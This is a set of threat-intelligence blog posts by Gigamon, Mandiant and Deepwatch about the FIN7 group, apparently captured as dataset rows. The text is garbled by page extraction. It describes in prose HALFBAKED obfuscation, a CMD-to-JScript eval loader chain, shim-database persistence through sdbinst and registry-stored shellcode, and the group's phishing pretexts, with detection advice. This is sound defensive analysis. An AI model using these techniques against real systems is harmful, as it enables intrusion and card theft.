active attacker. Conclusion The information-security industry as a whole commonly puts a lot of focus on top tier threats such as nation-state actors. While very real, these threats are a part of a different model than most organizations should likely consider. There are serious threats facing the average business and these groups continue to elevate their sophistication and learn from their engagements. With one goal in mind, these actors will continue to attack environments in an effort to profit off of the blindness of their victims. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 8 di 10 Footprints of FIN7: Tracking Actor Patterns (Part 2) - Gigamon Blog 09/09/24, 12:50 While FIN7 is a moderately sophisticated threat, the patterns of their operations and tradecraft decisions can be reliably detected by anyone with good visibility into their environment. Further, early investments in security-focused design and realistic threat modeling will allow organizations to better prepare for the inevitable targeting by one of these groups. We hope that these posts were insightful and allow you to bring similar defensive tradecraft into your environment. Thanks for reading! To learn more about Gigamon ATR, please visit www.gigamon.com/research/applied-threat-research- team.html (https://www.gigamon.com/research/applied-threat- research-team.html). OLDER ARTICLE NEWER ARTICLE Are You Effectively Securing Your Cloud Footprints of Fin7: Tracking Actor Patterns (Part Workloads? Learn How Gigamon and RSA Can 1) (https://blog.gigamon.com/2017/07/25/effectively- of-ﬁn7-tracking-actor-patterns-part-1/) Help (https://blog.gigamon.com/2017/07/26/footprints- securing-cloud-workloads-learn-gigamon-rsa- can-help/) (https://www.twitter.com/gigamon) (https://www.youtube.com/channel/UC6Vd7BRPT3wDE9DkEJNYinA) (https://www.linkedin.com/company/gigamon) (https://www.facebook.com/gigamon/) Website Terms (https://www.gigamon.com/content/gigamon/en_us/terms-agreement.html) Privacy Policy (https://www.gigamon.com/content/gigamon/en_us/privacy-policy.html) Cookie Policy (https://www.gigamon.com/content/gigamon/en_us/cookie-policy.html) Security (https://www.gigamon.com/content/gigamon/en_us/security-disclosure.html) https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ Pagina 9 di 10"
fin7,cti-hal,a3a21d421cff,G0046,"Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 (https://blog.gigamon.com) SEARCH THE BLOG CATEGORY: ALL POSTS CLOUD SECURITY ZERO TRUST NETWORKING SERVICE PROVIDER Home (https://blog.gigamon.com/) » Security (https://blog.gigamon.com/category/security/) » Footprints of Fin7: Pushing New Techniques to Evade Detection SECURITY (HTTPS://BLOG.GIGAMON.COM/CATEGORY/SECURITY/) / OCTOBER 8, 2017 Footprints of Fin7: Pushing New Techniques to Evade Detection ATR (https://blog.gigamon.com/author/atrteam/) https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 1 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 The Gigamon Applied Threat Research (ATR) team actively tracks threat activity associated with FIN7, a financially motivated actor targeting the retail industry. FIN7 has been constantly adapting their phishing documents in order to evade detection — their latest update has initial detections on VirusTotal of 0/59 and 1/59 for the RTF and DOCX formats, respectively. FIN7 leverages a number of targeted phishing techniques to initially exploit victims in the retail sector. Once they have an initial foothold the actor pivots to Point of Sale systems and steals large quantities of protected card data. In August, the Gigamon ATR team released a large set of indicators of compromise (IOCs) for infected document payloads that displayed similar infection characteristics and techniques to each other. Recently, the Gigamon ATR team observed a shift in techniques including a modified payload that uses a new embedded file type. Additionally, FIN7 has modified the obfuscation utilized by their HALFBAKED backdoor — likely to avoid detection in new or ongoing campaigns. While the newly observed malicious documents do not represent a “new” attack methodology, the change of payload may cause detection issues for legacy signatures and heuristic detections which utilize overly strict detection mechanisms, lacking in durability or layered coverage. This post details the newly observed methods and provides indicators associated with the identified infection documents. This will enable retail companies to validate their detections and leverage this intelligence to determine if they’ve been impacted by new campaigns. https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 2 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 Shifting Techniques Initial Payload In past versions of infection documents, the Gigamon ATR team observed the actor primarily utilize malicious shortcut files (LNK) or visual basic scripts (VBS or VBE) to achieve code execution from within their lure. These malicious files are embedded into the infection documents using the Object Linking and Embedding (OLE) framework within Windows, which allows objects from one application to be included in another. In the documents released today, FIN7 appears to have pivoted from using OLE embedded LNK files to using OLE embedded CMD files. When executed, the CMD file writes JScript to “tt.txt” under the current user’s home directory. The batch script then copies itself to “pp.txt”, also under the current user’s home directory, before running WScript using the JScript engine on the file. This JScript code will read from the file “pp.txt”, skipping the first four lines (the CMD code itself), but otherwise evaluating anything after the first character for each line in the file. Although different in implementation, this is a familiar technique, as FIN7 frequently runs commented out code that they read as a string through the use of JScript’s “eval” function. Both CMD and LNK file formats result in code execution, but the shift towards using CMD files may indicate a desire to stay ahead of detection authors. Halfbaked Obfuscation Change https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 3 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 Over the course of the past year, the actor’s unique backdoor, HALFBAKED, has continued to morph to improve capabilities and reduce detection surface. In the newest observed version, the Gigamon ATR team observed a slight tweak in the obfuscation strategy. Previously, different stages of the HALFBAKED codebase utilized base64 encoding, stored in a string array variable called “srcTxt”. The attacker now obfuscates that name and continues to break up the base64 string into multiple strings within an array as seen in Figure 1. (https://blog.gigamon.com/wp- content/uploads/2020/06/Screen-Shot-2017-10-06-at- 4.31.16-PM.png) Figure 1: Base64 encoded chunk of the new HALFBAKED functionality. New Halfbaked Feature Additionally, the HALFBAKED backdoor now includes a built-in command called “getNK2”, seen here in HALFBAKED’s command list (Figure 2). “getNK2” is designed to retrieve the victim’s Microsoft Outlook email client auto-complete list. This may suggest the actor’s desire to obtain new phishing targets within a victim organization. If any of these new targets fell https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 4 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 victim to the phishing lure, it would allow FIN7 to increase their foothold within a victim organization’s network and potentially pivot to new areas. (https://www.gigamon.com/content/gigamon/en_us.html) (https://blog.gigamon.com/wp- CONTACT (https://www.gigamon.com/content/gigamon/en_us/lp/free- CLOUD VISIBILITY DATA CENTER VISIBILITY INDUSTRY COMPANY INFORMATION IN THE NEWS RESOURCES CUSTOMERS VÜE COMMUNITY GET SUPPORT OVERVIEW ALREADY A PARTNER? NOT A PARTNER? FIND A PARTNER NETWORK SECURITY DATA CENTER VISIBILITY CLOUD VISIBILITY TRAFFIC INTELLIGENCE NETWORK SECURITY Customers Support Solutions SALES trial.html) content/uploads/2020/06/10.6_ﬁg2_halfbakedcommands_v2.png) (https://www.gigamon.com/content/gigamon/en_us/contact- sales) (https://www.gigamon.com/content/gigamon/en_us/contact-us.html) Resources DEMOS Partners Products EN Figure 2: HALFBAKED commands including the recent getNK2 addition. About Us GigaVUE Cloud Suite Blog (Https://Blog.gigamon.com) Resource Library View All Customer VÜE Dashboard Contact Support Support And Services Partner Portal Login Become A Partner Technology Alliance Partners Federal Build A Zero Trust Architecture Lower Your Tool Costs Accelerate Cloud Migration GigaVUE Fabric Manager GigaVUE Appliances SSL/TLS Decryption The command “getNK2” is likely named after outlook’s NK2 file (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Company- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Search- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) (Https://Community.gigamon.com/Gigamoncp/S/? (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Support- (Https://Gigamon.my.site.com/Partnercommunity/S/Login) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Technology- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Federal.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Campaigns/Zero- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cut- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Accelerate- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Management/Gigavue- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Events (https://support.office.com/en-us/article/Import-or-copy-the- Information.html) Trafﬁc/Cloud-Suite.html) Results.html? Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- And-Services/Contact-Support.html) And-Services.html) Partners/Become-A-Partner.html) Partners.html) Trust.html) Network-And-Security-Costs-By-50- Cloud-Migration.html) Fm.html) Trafﬁc/Physical-Nodes.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart/Ssl-Tls- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Financial Services Auto-Complete-List-to-another-computer-83558574-20DC- &T=All&Sort=Relevancy#T=Resources) Links&Utm_content=Nav-Support) Percent.html) Decryption.html) Careers AWS And-Events/Events.html) Education Services Policies Channel Partners (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Financial- Stronger Security Starts With Network Visibility Acquire Multi-Cloud Observability GigaSMART HC Series 4C94-A531-25A42EC8E8F0?ui=en-US&rs=en-US&ad=US), which the same “getNK2” command. The command will execute the file (https://www.msoutlook.info/question/844), so FIN7 has also written functionality to handle newer versions of Outlook within (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Careers.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- Cloud Journey Podcast Discussion Forum (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Education- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Policies.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Partners/Channel- Services.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Security- Make Network Changes Without Disruption (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Multi- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- Application Filtering contains a list of auto-complete addresses for Microsoft Outlook Newsroom Cloud/Gigavue-Cloud-Suite-Aws.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Navigating- (Https://Community.gigamon.com/Gigamoncp/S/Answers- Services.html) Partners.html) Operations.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Make- Cloud.html) Trafﬁc/Trafﬁc-Intelligence/Gigasmart.html) Trafﬁc/Physical-Nodes/Gigavue-Hc-Series.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- 2007 and 2010. Newer versions of outlook no longer use the NK2 Customers (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/News- Warranty Healthcare Life-In-The-Cloud-Podcast.html) And-Articles#Forums? Network-Changes-Without-Disruption.html) Trafﬁc/Application-Intelligence/Application- (Https://Www.gigamon.com/Content/Gigamon/En_us/Company/Customers.html) Azure And-Events/Newsroom.html) Professional Services (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Warranty.html) Partner Locator (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Healthcare.html) Assure Cloud Security And Compliance Network TAPs Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Filtering-Intelligence.html) Learning Center (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Support/Professional- (Https://Gigamon.my.salesforce- Put NetOps Back In Control (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Assure- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- IoT, OT, ICS Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Learning- Cloud/Gigavue-Cloud-Suite-Azure.html) Services.html) Sites.com/Partnerlocator/) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Network- Cloud-Security-Compliance.html) Trafﬁc/Network-Taps.html) Application Metadata (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/IOT.html) Center.html) Knowledge Articles (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Optimize- Operations.html) Google Cloud Reduce Cloud Cost And Complexity Trafﬁc Aggregators State, Local, Education (Https://Community.gigamon.com/Gigamoncp/S/Answers- Trafﬁc/Application-Intelligence/Application- Webinars (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Public- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Manage- (Https://Www.gigamon.com/Content/Gigamon/En_us/Products/Access- (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Industry/Sled.html) And-Articles? Metadata.html) (Https://Www.gigamon.com/Content/Gigamon/En_us/Resources/Resource- Cloud/Gigavue-Cloud-Suite-Google-Cloud- Cloud-Cost-Complexity.html) Trafﬁc/Trafﬁc-Aggregators.html) Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Service Providers Library/Webinar-Hub.html) Platform.html) Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Service- Kubernetes Provider.html) JScript function in Figure 3 on the victim system. https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 5 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- Product Documentation Cloud/Gigavue-Cloud-Suite-Kubernetes.html) (Https://Community.gigamon.com/Gigamoncp/S/Docs? Utm_source=Gigamon.com&Utm_medium=Referral&Utm_campaign=Community- Nutanix Links&Utm_content=Nav-Support) (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- Cloud/Gigavue-Cloud-Suite-Nutanix.html) OpenStack (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- (https://blog.gigamon.com/wp- content/uploads/2020/06/Screen-Shot-2017-10-06-at- 5.30.57-PM.png) VMware Cloud/Gigavue-Cloud-Suite-Openstack.html) 1 Figure 3: getNK2 command functionality. (Https://Www.gigamon.com/Content/Gigamon/En_us/Solutions/Cloud/Private- Cloud/Gigavue-Cloud-Suite-Vmware.html) Conclusion Detection authors must make trade-offs to optimize signature performance; narrow signatures lead to high fidelity detections, but risk missing changes in actor behaviors, meanwhile broader detection patterns provide better coverage, at the risk of more false positives. Combatting a well-resourced and adaptive adversary requires a layered approach of both signature styles. FIN7 has demonstrated that they are highly adaptable, evading detection mechanisms while impacting a number of large US retail companies over an extended period of time. The Gigamon ATR team will continue to remain vigilant, working to understand FIN7 and empower our customers and affected industries to defend themselves. This article was written by ATR team members Alex Sirr and Spencer Walden. https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 6 di 8 Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 Gigamon ThreatINSIGHT™ (https://www.gigamon.com/solutions/gigamon-insight.html) is a network security analytics solution that offers a SaaS capability that enables customers to gain and utilize widespread network visibility for security operations. As part of its research, the Gigamon ATR team coordinates disclosure of security threats and vulnerabilities with relevant parties in order to maximize both the response and victim remediation efforts as well as working to truly improve the security of customers and other victims prior to publishing blog posts. To learn more about the Gigamon ATR team, please visit www.gigamon.com/research/applied-threat-research- team.html (https://www.gigamon.com/research/applied-threat- research-team.html). OLDER ARTICLE NEWER ARTICLE Kaspersky and the Department of Homeland Cybersecurity in the Workplace: Adapt or Go the Security Binding Operational Directive: Supply Way of the Dodo Chain Out of Your Control – Technically, Legally, (https://blog.gigamon.com/2017/10/08/security- Existentially must-adapt-the-message-of-gartner-security- (https://blog.gigamon.com/2017/10/06/kaspersky- and-risk-summit-2017/) department-homeland-security-binding- operational-directive-supply-chain-control- technically-legally-existentially/) Website Terms (https://www.gigamon.com/content/gigamon/en_us/terms-agreement.html) https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 7 di 8 (https://www.twitter.com/gigamon) (https://www.youtube.com/channel/UC6Vd7BRPT3wDE9DkEJNYinA) (https://www.linkedin.com/company/gigamon) (https://www.facebook.com/gigamon/) Footprints of Fin7: Pushing New Techniques to Evade Detection - Gigamon Blog 06/09/24, 17:38 Website Terms (https://www.gigamon.com/content/gigamon/en_us/terms-agreement.html) Privacy Policy (https://www.gigamon.com/content/gigamon/en_us/privacy-policy.html) Cookie Policy (https://www.gigamon.com/content/gigamon/en_us/cookie-policy.html) Security (https://www.gigamon.com/content/gigamon/en_us/security-disclosure.html) Legal (https://www.gigamon.com/content/gigamon/en_us/legal.html) © Gigamon 2024 } https://blog.gigamon.com/2017/10/08/footprints-of-fin7-pushing-new-techniques-to-evade-detection/ Pagina 8 di 8"
fin7,cti-hal,80eeade773e5,G0046,"To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 Threat Intelligence To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence May 3, 2017 Mandiant Wri!en by: Ma!hew McWhi"", Jon Erickson, DJ Palombo In 2017, Mandiant responded to multiple incidents we a!ribute to FIN7, a #nancially motivated threat group associated with malicious operations dating back to 2015. https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 1 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 Throughout the various environments, FIN7 leveraged the CARBANAK backdoor, which this group has used in previous operations. A unique aspect of the incidents was how the group installed the CARBANAK backdoor for persistent access. Mandiant identi#ed that the group leveraged an application shim database to achieve persistence on systems in multiple environments. The shim injected a malicious in-memory patch into the Services Control Manager (“services.exe”) process, and then spawned a CARBANAK backdoor process. Mandiant identi#ed that FIN7 also used this technique to install a payment card harvesting utility for persistent access. This was a depa""ure from FIN7’s previous approach of installing a malicious Windows service for process injection and persistent access. Application Compatibility Shims Background According to Microso$, an application compatibility shim is a small library that transparently intercepts an API (via hooking), changes the parameters passed, handles the operation itself, or redirects the operation https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 2 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 elsewhere, such as additional code stored on a system. Today, shims are mainly used for compatibility purposes for legacy applications. While shims serve a legitimate purpose, they can also be used in a malicious manner. Mandiant consultants previously discussed shim databases at both BruCon and BlackHat. Shim Database Registration There are multiple ways to register a shim database on a system. One technique is to use the built-in “sdbinst.exe” command line tool. Figure 1 displays the two registry keys created when a shim is registered with the “sdbinst.exe” utility. Figure 1: Shim database registry keys Once a shim database has been registered on a system, the shim database #le (“.sdb” #le extension) will be copied to the “C:\Windows\AppPatch\Custom” directory for 32-bit shims or “C:\Windows\AppPatch\Custom\Custom64” https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 3 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 directory for 64-bit shims. Malicious Shim Database Installation To install and register the malicious shim database on a system, FIN7 used a custom Base64 encoded PowerShell script, which ran the “sdbinst.exe” utility to register a custom shim database #le containing a patch onto a system. Figure 2 provides a decoded excerpt from a recovered FIN7 PowerShell script showing the parameters for this command. Figure 2: Excerpt from a FIN7 PowerShell script to install a custom shim FIN7 used various naming conventions for the shim database #les that were installed and registered on systems with the “sdbinst.exe” utility. A common observance was the creation of a shim database #le with a “.tmp” #le extension (Figure 3). https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 4 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 Figure 3: Malicious shim database example Upon registering the custom shim database on a system, a #le named with a random GUID and an “.sdb” extension was wri!en to the 64-bit shim database default directory, as shown in Figure 4. The registered shim database #le had the same MD5 hash as the #le that was initially created in the “C:\Windows\Temp” directory. Figure 4: Shim database a!er registration In addition, speci#c registry keys were created that correlated to the shim database registration. Figure 5 shows the keys and values related to this shim installation. https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 5 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 Figure 5: Shim database registry keys The database description used for the shim database registration, “Microso$ KB2832077” was interesting because this KB number was not a published Microso$ Knowledge Base patch. This description (shown in Figure 6) appeared in the listing of installed programs within the Windows Control Panel on the compromised system. Figure 6: Shim database as an installed application Malicious Shim Database Details During the investigations, Mandiant observed that FIN7 used a custom shim database to https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 6 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 patch both the 32-bit and 64-bit versions of “services.exe” with their CARBANAK payload. This occurred when the “services.exe” process executed at sta""up. The shim database #le contained shellcode for a #rst stage loader that obtained an additional shellcode payload stored in a registry key. The second stage shellcode launched the CARBANAK DLL (stored in a registry key), which spawned an instance of Service Host (“svchost.exe”) and injected itself into that process. Figure 7 shows a parsed shim database #le that was leveraged by FIN7. Figure 7: Parsed shim database ""le For the #rst stage loader, the patch overwrote the “ScRegisterTCPEndpoint” function at Cloud Blog relative vi""ual address (RVA) “0x0001407c” Contact sales Get started for free within the services.exe process with the malicious shellcode from the shim database Solutions & technology #le. Ecosystem Developers & Practitioners https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 7 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 The new “ScRegisterTCPEndpoint” function (shellcode) contained a reference to the path of “\REGISTRY\MACHINE\SOFTWARE\Microso$\ DRM”, which is a registry location where additional malicious shellcode and the CARBANAK DLL payload was stored on the system. Figure 8 provides an excerpt of the parsed patch structure within the recovered shim database #le. Figure 8: Parsed patch structure from the shim database ""le The shellcode stored within the registry path “HKLM\SOFTWARE\Microso$\DRM” used the API function “RtlDecompressBu%er” to decompress the payload. It then slept for four minutes before calling the CARBANAK DLL payload's entry point on the system. Once loaded in memory, it created a new process named “svchost.exe” that contained the CARBANAK DLL. https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 8 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 Bringing it Together Figure 9 provides a high-level overview of a shim database being leveraged as a persistent mechanism for utilizing an in- memory patch, injecting shellcode into the 64-bit version of “services.exe”. Figure 9: Shim database code injection process Detection Mandiant recommends the following to detect malicious application shimming in an environment: 1. Monitor for new shim database #les created in the default shim database directories of https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 9 di 11 To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence | Google Cloud Blog 10/09/24, 12:07 “C:\Windows\AppPatch\Custom” and “C:\Windows\AppPatch\Custom\Custom64 ” 2. Monitor for registry key creation and/or modi#cation events for the keys of “HKLM\SOFTWARE\Microso$\Windows NT\CurrentVersion\AppCompatFlags\Cust om” and “HKLM\SOFTWARE\Microso$\Windows NT\CurrentVersion\AppCompatFlags\Insta lledSDB” 3. Monitor process execution events and command line arguments for malicious use of the “sdbinst.exe” utility Posted in Threat Intelligence—Security & Identity Related articles https://cloud.google.com/blog/topics/threat-intelligence/fin7-shim-databases-persistence/ Pagina 10 di 11"
fin7,cti-hal,ff144577b163,G0046,"Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 05.13.19 Threat Report < https://www.deepwatch.com/blog_category/threat-report/> Proﬁle of an Adversary – FIN7 By Bryan Austin Estimated Reading Time: 10 minutes The majority of companies in either the Retail or Hospitality industries are [sadly] familiar with FIN7. We face many challenges in our various environments across multiple Enterprises. Overview This article, while focused on FIN7, is truly applicable to numerous enemies that we face. This article is aimed at defrocking a particular enemy and arming us all with better tools to defend against them. It is also worth noting that the current syndicate attributed to FIN7 is not the same organizational composition that it once was. Thanks to high proﬁle arrests < https://www.justice.gov/opa/pr/three-members-notorious-international- cybercrime-group-ﬁn7-custody-role-attacking-over-100> back in 2018. https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 1 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 Meet the Bad Guys FIN7 has been known to be in operation since 2012 (although some estimates put them being active as far back as 2011), when TrustWave SpiderLabs ﬁrst observed threat behavior that became much more proliﬁc after 2015. Since then FIN7 has been identiﬁed by many organizations, including: FireEye – FIN7 CrowdStrike – Carbon Spider Media – Carbanak Gang/Group This group has suspected ties to Russian organized crime and has netted roughly $1 Billion USD in the last half-decade. Sources indicate a very loose connection with the Russian GRU. The FIN7 group is increasingly adaptable not only to the geopolitical inﬂuences around them, but also quite capable in the environments they ﬁnd themselves in. Additionally, the group has strong ties to Ukraine, where 3 members of the FIN7 group were arrested in 2018, though often times Russian cyber operations ﬁnd their ﬁrst deployment in Ukraine. Targeting The FIN7 group began by targeting banks in the Russian Federation, but in 2015 began to transition their targeting to a broader scope to include the Middle East, Europe and the United States. Currently, the group is known to target auto manufacturers, ﬁnancial organizations, technology companies and innovators and hospitality, and retail organizations. As of 2018, the main targets of this group are in the ﬁnancial, retail and hospitality sectors. The US Department of Justice estimates put their intrusions at 6,500 POS terminals at 3,600 separate organizations. As a group, their targeting is clear, but at the onset of the attack it can seem less so. Historically the group has targeted individuals who are listed in the organizations SEC https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 2 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 ﬁlings which can be viewed publicly by looking the business up in the Edgar < https://www.sec.gov/edgar/searchedgar/companysearch.html> ﬁling database. Other individuals targeted for attack are customer service representatives who are attempting to resolve an issue they’ve identiﬁed from the attack. Techniques FIN7 begins the attack via malware delivery. This starts as a spear phishing email sent to the initial target. Generally the sentiment of the email is anger and accusations against the target’s organization either due to a policy or a product. In short, the attacker is disguised as a highly dissatisﬁed customer. The attacker performs a technique commonly called “amygdala hijacking” by eliciting a fear response in the target, and proceeds to reinforce the hijack by making threats and demands of the target which puts the individual on a defensive stance. Once the target responds, the actor then shifts to a deescalation tactics which eases the tension of the situation and causes the target to let their guard down in order to develop a more civil rapport with the target. Additionally, the actor then begins to o""er help to assist the target in resolving the issue which they themselves have created, thus “hooking” the target by making themselves seem to be the hero. The actor then begins to use the ﬁrst name of the target to establish a sense of intimacy, common knowledge and familiarity. The exchange then leads to an initial document delivery that is usually benign but possesses a tracking pixel that allows the actor to verify whether or not the target is opening attachments, and if so can provide initial visibility into the system of the target. The documents for this phase are often either blank or built for the campaign and correspond to the topic of conversation from the attacker. The second document the attacker sends is usually the one with the actual payload. This document has either a VBA macro or an embedded OLE which persuades the target to run these in order to drop the ﬁrst stage loaders. If the ﬁrst stage loader is not dropped, the attacker resumes the threat tactic and escalates the issue to the target’s supervisor which indicates an extensive amount of OSINT and revealing the extent the https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 3 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 attacker is willing to pursue a single individual. Tools Since FIN7 focuses on obtaining ﬁnancial data, they rely heavily on malware to scrape consumer credit card information from Point Of Sale (POS) systems as well as other account information from databases in the network. The data stolen is then used to steal funds from victims and commit fraud, which is how the organization funds itself. There is also a possible connection to the 2016 SWIFT attacks, many of which have since been attributed to North Korea, however evidence of this is limited and open to interpretation. The group typically follows a standard sequence of events: Spear phishing a target with a document loaded with a malware payload which as of May 2018 has been the Gri""on payload, or a combination of SQLRat and DNSBot historically. These trends, observed by FireEye/Mandiant and Flashpoint respectively, always lead to the loading of an additional payload which is most commonly the Tinymet meterpreter payload to establish a beachhead in the network. This begins the beaconing back to the Cobalt Strike servers. To establish persistence, the group then injects a scheduled task to reestablish the C2 connection to Cobalt Strike which historically is run twice a day. From there the adversary loads process injection tools or memory scrapers (commonly mimikatz) and pivots using tools like powersploit, RDP services, and PowerAdmin Exec. A new development was the discovery of the Astra PHP Panel being used in conjunction with SQLRat. This discovery was posted in March 2019 from Flashpoint, was tracked back via the tie in established by the US DOJ; the Combi Security company was acting as a front and recruitment platform for the FIN7 group. The malware most commonly associated with FIN7 is the Carbanak family, which the group gained as its common moniker. The Carbanak malware is not, however, exclusive to FIN7, nor do they use it explicitly. Currently, the group is using macro enabled word documents and spear phishing to deliver initial payloads that pull down second stage loaders like Spy. Sekur, although recently the Bateleur JavaScript https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 4 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 backdoor has come into fashion as of November 2017. Additionally, the group heavily targets the following CVEs: CVE-2015-2545 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015- 2545> CVE-2015-1701 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015- 1701> CVE-2017-0199 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017- 0199> The group has begun branching out in using various malware versions and a full listing of the known IOCs for the new SQLRat and DNSBot additionally the Astra PHP panel are included at the end of this document as well as a list of links to the open source projects to allow for greater research. Defensive Options This adversary is persistent, capable, adaptable, and competent. That being said, there are a variety of options to begin defending your environment. The most critical aspect is detection. Due to FIN7’s heavy use of spear phishing to deliver malicious MSFT O#ce documents to users, the most common exploits are scripts written in PowerShell or VBA and 